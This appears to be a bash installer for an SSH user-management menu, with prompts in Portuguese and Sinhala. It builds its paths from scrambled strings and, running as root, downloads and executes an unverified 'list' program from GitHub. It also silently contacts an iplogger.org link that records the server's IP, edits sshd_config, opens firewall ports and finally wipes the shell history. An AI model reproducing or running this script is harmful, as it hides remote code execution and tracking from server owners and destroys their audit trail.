#!/bin/bash
clear
[[ "$(whoami)" != "root" ]] && {
echo -e "\033[1;33m[\033[1;31mErro\033[1;33m] \033[1;37m- \033[1;33mvoඔබ root ලෙස ධාවනය කළ යුතුයි\033[0m"
rm $HOME/Plus > /dev/null 2>&1; exit 0
}
_lnk=$(echo 'z1:y#x.5s0ul&p4hs$s.0a72d*n-e!v89e032:3r'| sed -e 's/[^a-z.]//ig'| rev); _Ink=$(echo '/3×u3#s87r/l32o4×c1a×l1/83×l24×i0b×'|sed -e 's/[^a-z/]//ig'); _1nk=$(echo '/3×u3#s×87r/83×l2×4×i0b×'|sed -e 's/[^a-z/]//ig')
cd $HOME
fun_bar () {
comando[0]="$1"
comando[1]="$2"
(
[[ -e $HOME/fim ]] && rm $HOME/fim
${comando[0]} -y > /dev/null 2>&1
${comando[1]} -y > /dev/null 2>&1
touch $HOME/fim
) > /dev/null 2>&1 &
tput civis
echo -ne "  \033[1;33mAGUARDE \033[1;37m- \033[1;33m["
while true; do
for((i=0; i<18; i++)); do
echo -ne "\033[1;31m#"
sleep 0.1s
done
[[ -e $HOME/fim ]] && rm $HOME/fim && break
echo -e "\033[1;33m]"
sleep 1s
tput cuu1
tput dl1
echo -ne "  \033[1;33mAGUARDE \033[1;37m- \033[1;33m["
done
echo -e "\033[1;33m]\033[1;37m -\033[1;32m OK !\033[1;37m"
tput cnorm
}
function verif_key () {
krm=$(echo '5:q-3gs2.o7%8:1'|rev); chmod +x $_Ink/list > /dev/null 2>&1
[[ ! -e "$_Ink/list" ]] && {
echo -e "\n\033[1;31mKEY INVÁLIDA!\033[0m"
rm -rf $HOME/Plus > /dev/null 2>&1
sleep 2
clear; exit 1
}
}
echo -e "\033[0;34m
    Hora Pusa ssh script"
echo -e "\033[1;37m════════════════════════════════════════════════════\033[0m"
tput setaf 7 ; tput setab 4 ; tput bold ; printf '%40s%s%-12s\n' "SEJA MUITO BEM VINDO (A)" ; tput sgr0
echo -e "\033[1;37m════════════════════════════════════════════════════\033[0m"
echo ""
echo -e "             \033[1;31mATENCAO! \033[1;33mESSE SCRIPT IRA !\033[0m"
echo ""
echo -e "\033[1;31m• \033[1;33mමෙවලම් ලෙස පිටපත් කට්ටලයක් ස්ථාපනය කරන්න\033[0m"
echo -e "\033[1;33m  නෙට්වර්ක්, සිස්ටම් සහ පරිශීලක කළමනාකරණය සඳහා\033[0m"
echo ""
echo -e "\033[1;32m• \033[1;32mDICA! \033[1;33mඔබේ තේමාව තුළ අඳුරු තේමාව භාවිතා කරන්න\033[0m"
echo -e "\033[1;33m  වඩා හොඳ අත්දැකීමක් සහ එය බැලීම!\033[0m"
echo ""
echo -e "\033[1;31m⋇⋇⋇⋇⋇⋇⋇⋇⋇⋇⋇⋇⋇⋇[\033[1;33m • \033[1;32m@Jeffssh\033[1;33m •\033[1;31m ]⋇⋇⋇⋇⋇⋇⋇⋇⋇⋇⋇⋇⋇⋇\033[0m"
echo ""
#-----------------------------------------------------------------------------------------------------------------
echo -ne "\033[1;36mසාමාන්‍යය ලෙස නොමිලේ [N/S]: \033[1;37m"; read x
[[ $x = @(n|N) ]] && exit
sed -i 's/Port 22222/Port 22/g' /etc/ssh/sshd_config  > /dev/null 2>&1
service ssh restart  > /dev/null 2>&1
echo -e "\n\033[1;36mVERIFICANDO... \033[1;37m 16983:16085\033[0m" ; rm $_Ink/list > /dev/null 2>&1; wget -P $_Ink https://raw.githubusercontent.com/Jeffssha/NET-WORLD/main/list > /dev/null 2>&1; verif_key
sleep 3s
echo "/bin/menu" > /bin/h && chmod +x /bin/h > /dev/null 2>&1
rm versao* > /dev/null 2>&1
wget https://raw.githubusercontent.com/Jeffssha/NET-WORLD/main/SSHPLUS/modulos/versao > /dev/null 2>&1
> /dev/null 2>&1
wget https://iplogger.org/10BEq > /dev/null 2>&1
> /dev/null 2>&1
rm 2lHZ43 > /dev/null 2>&1
#-----------------------------------------------------------------------------------------------------------------
echo -e "\n\033[1;32mKEY VALIDA!\033[1;32m"
sleep 1s
echo ""
[[ -f "$HOME/usuarios.db" ]] && {
clear
echo -e "\n\033[0;34m═════════════════════════════════════════════════\033[0m"
echo ""
echo -e "                 \033[1;33m• \033[1;31mATENCAO \033[1;33m• \033[0m"
echo ""
echo -e "\033[1;33mපරිශීලක දත්ත ගබඩාවක් \033[1;32m(usuarios.db) \033[1;33mFoi"
echo -e "හමු විය! මායිම ආරක්ෂා කර ගැනීමෙන් එය තබා ගැනීමට අවශ්‍යයි"
echo -e "පරිශීලකයින්ගේ එකවර සම්බන්ධතා? නැත්නම් ප්‍රාර්ථනා කරන්න"
echo -e "නව දත්ත සමුදායක් නිර්මාණය කරන්න?\033[0m"
echo -e "\n\033[1;37m[\033[1;31m1\033[1;37m] \033[1;33mදත්ත සමුදාය ධාරාව තබා ගන්න\033[0m"
echo -e "\033[1;37m[\033[1;31m2\033[1;37m] \033[1;33mනව දත්ත සමුදායක් සාදන්න\033[0m"
echo -e "\n\033[0;34m═════════════════════════════════════════════════\033[0m"
echo ""
tput setaf 2 ; tput bold ; read -p "Opção ?: " -e -i 1 optiondb ; tput sgr0
} || {
awk -F : '$3 >= 500 { print $1 " 1" }' /etc/passwd | grep -v '^nobody' > $HOME/usuarios.db
}
[[ "$optiondb" = '2' ]] && awk -F : '$3 >= 500 { print $1 " 1" }' /etc/passwd | grep -v '^nobody' > $HOME/usuarios.db
clear
tput setaf 7 ; tput setab 4 ; tput bold ; printf '%35s%s%-18s\n' "ස්ථාපනය සඳහා රැඳී සිටින්න" ; tput sgr0
echo ""
echo ""
echo -e "          \033[1;33m[\033[1;31m!\033[1;33m] \033[1;32mපද්ධතිය යාවත්කාලීන කිරීම \033[1;33m[\033[1;31m!\033[1;33m]\033[0m"
echo ""
echo -e "    \033[1;33mයාවත්කාලීනයන් ලිට්ල් එකක් ගන්න!\033[0m"
echo ""
fun_attlist () {
apt-get update -y
[[ ! -d /usr/share/.plus ]] && mkdir /usr/share/.plus
echo "crz: $(date)" > /usr/share/.plus/.plus
}
fun_bar 'fun_attlist'
clear
echo ""
echo -e "          \033[1;33m[\033[1;31m!\033[1;33m] \033[1;32mINSTALANDO PACOTES \033[1;33m[\033[1;31m!\033[1;33m] \033[0m"
echo ""
echo -e "\033[1;33mසමහර පැකේජ අතිශයින්ම අත්‍යවශ්‍යයි!\033[0m"
echo ""
inst_pct () {
_pacotes=("bc" "screen" "nano" "unzip" "lsof" "netstat" "net-tools" "dos2unix" "nload" "jq" "curl" "figlet" "python3" "python-pip")
for _prog in ${_pacotes[@]}; do
apt install $_prog -y
done
pip install speedtest-cli
}
fun_bar 'inst_pct'
[[ -f "/usr/sbin/ufw" ]] && ufw allow 443/tcp ; ufw allow 80/tcp ; ufw allow 3128/tcp ; ufw allow 8799/tcp ; ufw allow 8080/tcp
clear
echo ""
echo -e "              \033[1;33m[\033[1;31m!\033[1;33m] \033[1;32mනිම කිරීම\033[1;33m[\033[1;31m!\033[1;33m] \033[0m"
echo ""
echo -e "      \033[1;33mකාර්යයන් සහ සැකසුම් සම්පූර්ණ කිරීම!\033[0m"
echo ""
fun_bar "$_Ink/list $_lnk $_Ink $_1nk $key"
clear
echo ""
cd $HOME
echo -e "        \033[1;33m • \033[1;32mස්ථාපනය සම්පූර්ණයි\033[1;33m • \033[0m"
echo ""
echo -e "\033[1;31m \033[1;33mප්‍රධාන විධානය: \033[1;32mmenu\033[0m"
echo -e "\033[1;33m වැඩි විස්තර \033[1;31m(\033[1;36mටෙලිග්‍රෑම්\033[1;31m): \033[1;37m@Jeffssh\033[0m"
rm $HOME/Plus && cat /dev/null > ~/.bash_history && history -c
